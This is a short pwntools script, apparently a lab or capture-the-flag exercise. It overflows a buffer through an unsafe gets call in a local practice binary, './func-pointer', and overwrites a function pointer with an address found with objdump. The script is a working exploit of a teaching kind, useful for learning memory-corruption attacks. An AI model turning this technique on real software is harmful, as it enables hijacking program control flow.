#!/bin/python3

"""
 Second example of abusing get function
 rewrite of function pointer

 to find the target address use :
 objdump -d -M intel --section=.text ./binary
"""

from pwn import *
# here the objdump find
special_address = p32(0x400567)
p = process("./func-pointer")
payload = cyclic(14)
p.sendline(payload + special_address)

print(p.readall())
